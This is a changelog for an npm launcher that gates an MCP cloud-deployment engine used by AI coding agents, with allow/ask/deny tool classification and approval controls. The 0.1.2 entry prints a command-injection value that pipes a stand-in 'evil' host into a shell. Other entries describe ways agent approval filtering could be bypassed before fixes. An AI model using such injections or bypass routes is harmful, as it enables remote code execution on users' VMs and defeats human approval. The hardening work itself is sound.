# Changelog — @dzhechkov/cloudru-hub

## 0.1.14 — 2026-10-20

- Prepare an exact optional dependency on `@dzhechkov/cloudru-vm-linux-x64@0.2.6`.
  A fresh Linux/x64 installation resolves the separately packed Go engine;
  no postinstall download is used.
- Credit Timur's substantial Cloud.ru API testing and the defects it revealed;
  correct the earlier attribution in current package materials.
- Build the Linux/x64 platform engine with `CGO_ENABLED=0` and pin the resulting
  static binary. The first GitHub Actions build exposed a C-toolchain-dependent
  hash from the earlier dynamic build; the static artifact passed its GitHub CI build.

## 0.1.13 — 2026-10-20

This release publishes the previously private launcher and host-adapter preview.
The Go engine is not included in this npm archive or available as a platform
package yet. All Cloud.ru operations require an owner-supplied engine matching
the pinned SHA-256; both MCP launcher routes refuse a mismatched engine.

- Complete both OpenCode and Pi live static-site VM scenarios: agent-authored
  Snake and the pinned 12-file repository archive. Each host retained one
  `deploy_apply` result per run, independent HTTP bytes matched the reviewed
  source, and exact VM/security-group cleanup restored baseline inventory.
  Set the host-specific long-call timeout to 1,200 seconds.
- Add an opt-in `k8s-deploy` pilot for Codex, Claude Code, Hermes, OpenCode and
  Pi. A local one-use approval binds an exact three-resource Snake manifest to
  an existing cluster, namespace and project; the proxy exposes only bounded
  readback and sends `create_only=true` to avoid patching name collisions.
  The private Go engine is rebuilt as `0.2.6-20261020` with SHA-256
  `89c5073418927ee71ac1de381eaba5ab69d599d615edc51b868d876e712dbf10`.
  Local tests pass; a Kubernetes role was later granted and the four available
  hosts passed live deployment. Claude Code inference remains unavailable.

- Keep Hermes MCP discovery responsive while a long `deploy_apply` is running:
  cache the pinned proxy's filtered tool list after its first successful read.
  The previous serial Go backend could not answer Hermes' keepalive during VM
  creation, causing a reconnect and an unknown outcome for the agent. Both
  post-fix live Snake scenarios passed: Hermes received the final apply result,
  independently served bytes matched the approved source, and each temporary
  VM and dedicated security group was removed.

- Verify Hermes' built-in import of this server's existing Codex CLI OAuth
  credentials. The isolated and default Hermes profiles now select
  `openai-codex` / `gpt-6-sol` and each passed a short inference probe. This
  cleared the model-provider blocker before the live Hermes VM acceptance runs.

- Accept both flat and nested Cloud.ru subnet availability-zone IDs during VM
  planning; reject conflicting IDs. Live `/api/v1/subnets` returned the nested
  form and previously made the planner reject a valid project subnet. Add API
  response and planner regression tests.
- Complete both Codex-hosted static-site VM acceptance scenarios (new Snake
  source and a pinned GitHub archive), with exact-byte HTTP verification and
  cleanup of each test VM/security group. Hermes connects to the 12-tool
  profile but its available model-provider credentials failed before inference;
  OpenCode and Pi were still pending at this point. The final rebuilt binary
  was checked with a read-only live plan, Go and package tests; the two paid
  deploys used the immediately preceding binary before fail-closed zone-field
  hardening.

- In the private preview, add bounded static-site Cloud-init deployment with
  reviewed source digests, a dedicated HTTP security group, existing-IP
  approval, exact-byte HTTP checks, and durable run checkpoints. The preview
  engine pin was `0.2.5-20261020` at that stage; public engine redistribution remains a
  separate gate.

- Add `mcp-safe`, a pinned MCP process boundary that exposes only allow-classified tools,
  blocks other calls before the engine, and supports named toolsets. Host installers default
  to the 11-tool inventory group; `all` exposes the full 78-tool allow-classified surface.
- Add project MCP registrations for Codex, OpenCode and Pi and a guarded Hermes YAML
  registration. Hermes receives an explicit path to a locally hash-verified engine because
  it filters inherited environment variables. Complex configuration and pre-existing Cloud.ru entries are refused.
- Canonicalize forwarded JSON-RPC requests to prevent case-insensitive Go field aliases
  from bypassing tool filtering; close the proxy when its engine exits unexpectedly.
- Repair `self-test` tools/list probing so a persistent MCP server is stopped after its
  response; report a SHA-256 mismatch as a failed step.
- Add fake-engine boundary tests and verify the real pinned engine's 144-tool classification
  and the proxy's 11-tool inventory list locally. The installed Hermes client connected to
  the generated server and discovered 11 tools; other host-session activation and real
  Cloud.ru operations remain unverified.
- Import the Go engine into the private source tree with provenance; fix shell quoting in
  `logs`, make `stack_status` observational, fail `doctor` on failed checks, refuse a VM
  create when inventory fails, and report state-persistence failure after a create.
- Pin the locally rebuilt `0.2.4-20261019` Go engine and recapture its 144-tool schema.
  `stack_status` changes from ask to allow after its Go behavior fix; `stack_apply`
  remains ask. The current public platform package does not match this private pin.
- Add an opt-in `vm-deploy` profile for Hermes and Codex with a private credentials
  file, exact-plan/cost approval, one-use apply, and VM-scoped remote execution.
  Fake-engine tests cover forged confirmation, approval replay, changed plans and
  execution on an unrelated VM. Live Cloud.ru acceptance is pending temporary keys.

## 0.1.6

Corrects the link added in 0.1.5: the Тимур credit now points at his about page
(https://shkrbkv.ru/about/), not at a single note. The 0.1.5 entry below is left as written — it
records what that release actually shipped, and a dated entry is not rewritten to hide a wrong link.

## 0.1.5

Attribution only, no code change. Both README mentions of Тимур — the Hermes engine author whose
grant satisfied the ADR-001 licence hold — now link to his site
(https://shkrbkv.ru/notes/agent-guardrails/), so the credit on the npm page points at the person
rather than just naming him. The LICENSE grant record and the historical changelog entries are left
exactly as written: a licence text and a dated record are not places to retrofit links.

## 0.1.4 — 2026-08-12 (FIRST PUBLICATION — ADR-001 hold satisfied, AM-2)

- **The licence hold is SATISFIED and the pack is published.** Тимур — the author of the
  Hermes engine additions (built on the owner's original Go CLI foundation, ADR-001
  AM-1) — approved publication; owner-reported 2026-08-12, recorded in
  `features/hermes-claude-adaptation/03_adr/grant-record-2026-08-12.md` (linked from the
  LICENSE `Grant-Confirmation:` line). Honesty: the approval is owner-attested; archiving
  the author's written confirmation is a recorded owner follow-up. No licence is
  fabricated on the author's behalf: the pack still ships ZERO engine-addition bytes,
  `license: MIT` covers only the owner's code, and LICENSE Part 2 explicitly grants no
  third-party rights to the engine additions.
- Hold mechanics flipped legitimately, not cosmetically: `private:true` and the PENDING
  placeholder removed; the `licenseHold` trigger field deliberately KEPT (per the
  `dz guard` `licence-hold` rule design a satisfied hold passes with the trigger in
  place, so the rule keeps verifying LICENSE/NOTICES/SPDX on every future publish).
- Hold-era pack tests replaced by post-grant invariants: honest grant wording
  (owner-attested, no fabricated grant deed), Grant-Confirmation URL present, author
  attribution by name, licenseHold-stays-declared, SPDX-matches-LICENSE (the ADR-001
  Confirmation test), publishable-state. Mutation registry entries updated in kind
  (`licence-publishable-state-asserted`, `licence-spdx-matches-license-file`;
  the LICENSE file itself is not gate-mutable — extensionless, no parser — so the
  Grant-Confirmation content is covered by the pack tests + the guard rule directly).
  Suite 71 → 70 tests (the npm-layer EPRIVATE probe retired with `private:true`);
  mutation gate 13/13 PROVEN (MEASURED — 2026-08-12).
- NOT in this release: the binary-carrying platform package
  `@dzhechkov/cloudru-vm-linux-x64` (ADR-002 trusted-CI build + go-licenses
  reconciliation still required before its first publication).

## 0.1.3 — 2026-08-10 (still HELD unpublished — ADR-001; Variant A binary-name leak scrubs)

- **LOW, dialect compiler — the engine binary name `cloudru-vm` handled by targeted leak-form
  SCRUBS, deliberately NOT by the codename net.** The bare token is ALSO the legitimate MCP
  server name that MUST appear in output — PROVEN before coding: `\bcloudru-vm\b` matches the
  compiler's OWN injected tool_search prose `сервера cloudru-vm видны` (over-block), and
  `mcp__cloudru-vm__` is spared only because `_` is a word char. So `forbiddenCodenames` is
  unchanged; instead both targets (claude-code, codex) gain two ordered replacements placed
  AFTER the longer `cloudru-vm-cli` scrub: (1) dotted config path `\.cloudru-vm(?![\w-])` →
  `.cloudru-hub` (lookahead spares `.cloudru-vm-cli`); (2) CLI invocation
  `\bcloudru-vm[ \t]+(?=(?:deploy|status|logs|destroy|verify|init|version|list-zones|list-images|mcp|doctor)\b)`
  → `cloudru-hub ` — the verb alternation is the engine's REAL cobra command set, cited from
  the baseline `engine/cmd/cloudru-vm/main.go` AddCommand block (lines 53-65); `[ \t]+` (not
  `\s+`) so a line break is never joined, whole-word verbs so `cloudru-vm deployment` and
  Russian prose stay untouched. RED-before/GREEN-after pinned in tests (0.1.2 shipped
  `~/.cloudru-vm/config` and `cloudru-vm deploy` INTACT with ok=true — MEASURED); over-block
  guard test proves the MCP server prose + `mcp__cloudru-vm__stack_status` compile CLEAN and
  unrewritten; a verb-set test pins the alternation to the engine command set. Two mutation
  entries (`dialect-binary-path-leak-scrubbed`, `dialect-binary-invocation-leak-scrubbed`)
  keep each scrub RED when disarmed. Suite 66 → 71 tests; mutation gate 11 → 13 PROVEN.

## 0.1.2 — 2026-08-10 (still HELD unpublished — ADR-001; closes 2 re-QE residuals)

- **HIGH, ADR-004 AM-2 — `logs` reclassified allow→ask; the classification method gains a
  SECOND hazard axis (reaching a remote shell with a user-controlled argument).** The AM-1
  re-audit checked only "advances a job / spends money / returns a secret"; it did NOT
  check whether a tool passes a user arg into a remote shell. `logs` (classified `allow`)
  does — VERIFIED against the pinned baseline: `handleLogs` (`tools.go:1758`) passes the
  user `service` arg to `engine.Logs`, which concatenates it RAW into
  `cmd += " " + opts.Service` (`engine/logs.go:61`) → `Deployer.Exec` (`logs.go:64`) → SSH
  `session.CombinedOutput` (`internal/deploy/ssh.go:117`). So `service="app; curl evil | sh"`
  is arbitrary RCE on the user's VM behind a silent `allow`. Re-audited ALL 78 allow tools
  against the new axis: `logs` is the ONLY shell-reaching allow tool (every other shell
  site — `vm_exec`, `deploy`, `deploy_apply`/captainkeys, `k8s_kubectl`/`k8s_apply`/`k8s_helm`
  — is already `ask`). New golden split: 65 ask / 2 deny / 77 allow. Invariant pinned
  layer-1: `logs===ask` test, method-doc-documents-shell-reach test, no-allow-admits-shell-reach
  test, mutation-registry entry `brake-logs-stays-ask`. Engine injection flagged to the
  author (ADR-004 AM-2; licence-blocked, not fixed here).
- **LOW, dialect compiler — codename allowlist expanded to the full engine identity.**
  `forbiddenCodenames` covered only `hermes`; the tokens `dzhechko` (go-module owner),
  `cloudru-vm-cli` (CLI name), and `captainkeys` (`captainkeys.go`) compiled CLEAN
  (VERIFIED). Now all four are gated, case-insensitive, with WORD-BOUNDARY matching (not
  substring): necessary because a raw `dzhechko` substring over-blocks the legitimately
  published scope `@dzhechkov` (= `dzhechko`+`v`), and word boundaries also drop harmless
  `thermes`-class false positives without weakening the net against any observed real leak
  shape (`~/.hermes/`, `hermes-agent`, prose "Hermes", Cyrillic-suffixed `hermesовский`).
  Each identity token gets a scrub replacement (go-module path → published package name);
  the real corpus still compiles with 0 survivors on both targets (MEASURED). Mutation
  entry `dialect-codename-gate-armed` updated for the expanded list, stays RED when emptied.
- Tests 58 → 66 (MEASURED — `node --test 'test/*.test.mjs'`); mutation gate 10/10 → 11/11
  PROVEN (MEASURED — `dz mutation-gate --package packages/@dzhechkov/cloudru-hub`).

## 0.1.1 — 2026-08-10 (still HELD unpublished — ADR-001; closes 2 cross-model QE findings)

- **HIGH (false-safe), ADR-004 AM-1 — `stack_status` reclassified allow→ask, and the
  classification METHOD corrected.** `handleStackStatus` (`tools_stack.go:451`) advances
  planned/running jobs (`:479-484` → `advance` → `s.callTool` `:220`), invoking the paid
  create tools with no confirmation — LIVE-REPRODUCED against the pinned baseline: one
  `stack_status` call moved a planned job `planned→running` and attempted `provision`
  twice (stopped only at AUTH_REQUIRED), so the fully-allow chain
  `stack_plan→stack_status` defeated the brake with zero prompts. All 79 former allow
  tools re-audited against actual engine handler BEHAVIOUR (not schema shape); 78
  confirmed genuinely read-only (each entry's `why` now cites the handler file:line),
  `stack_plan`/`deploy_plan` verified to create nothing (LOCAL plan file only). New
  golden split: 64 ask / 2 deny / 78 allow. Invariant pinned layer-1: `stack_status===ask`
  test, allow-requires-behaviour-audit test, mutation-registry entry
  `brake-stack-status-stays-ask`.
- **MEDIUM, dialect compiler — positive codename invariant.** The 8-token denylist let
  the bare codename and the `~/.hermes/` path through (real-corpus compile returned
  `ok=true` with 5 case-insensitive survivors — MEASURED). `compileSkill` now hard-fails
  on ANY case-insensitive codename occurrence in ANY emitted file
  (`data/dialects.json.forbiddenCodenames`), with scrub replacements for the observed
  leak shapes (`~/.hermes/` path, `hermes-agent` example name, 2 prose mentions); the
  real corpus now compiles with 0 survivors on both targets (MEASURED). Mutation-registry
  entry `dialect-codename-gate-armed`.
- Tests 52 → 58 (MEASURED — `node --test 'test/*.test.mjs'`); mutation gate 8/8 → 10/10
  PROVEN (MEASURED — `dz mutation-gate --package packages/@dzhechkov/cloudru-hub`).

## 0.1.0 — 2026-08-10 (prepared, HELD unpublished — ADR-001)

Initial build of the npm launcher for the `cloudru-vm` MCP engine, per
`features/hermes-claude-adaptation/` ADR-001/002/004/005/006/010.

- Launcher with runtime engine resolution (env → config → optional platform package),
  sha256 pin verification against the 0.2.3-20260718 baseline; `resolve`, `self-test`,
  `mcp`, `install`, `compile-skill` commands.
- ADR-004 brake: golden classification of all 144 engine tools (63 ask / 2 deny /
  79 allow — MEASURED, `data/tools-classification.json`), permission-rule emission in
  both mcp__ prefix spellings, PreToolUse ssh-guard + kubectl-rollout veto with an
  EXECUTED install-time probe.
- ADR-005 tiering: claude-code full / codex plan-only / degraded refused /
  agents-md+gemini pointer-only (≤2048 chars, mandatory no-veto warning).
- ADR-006 dialect compiler: config-driven target variants, forbidden-token hard gate,
  dangling-link unlinking, 12 000-char lossy router cap, byte-deterministic.
- Publish hold armed three ways: `private:true` (npm layer), the `dz guard`
  `licence-hold` HARD rule (harness-core), and mutation-gate entries 8/8 PROVEN
  (MEASURED — `dz mutation-gate --package packages/@dzhechkov/cloudru-hub`, 2026-08-10).
- 52 tests (MEASURED — `node --test 'test/*.test.mjs'`, 52/52 pass, 2026-08-10).
- NOT published: LICENSE Part 2 carries the pending-grant placeholder; see README
  "Post-grant publish checklist".
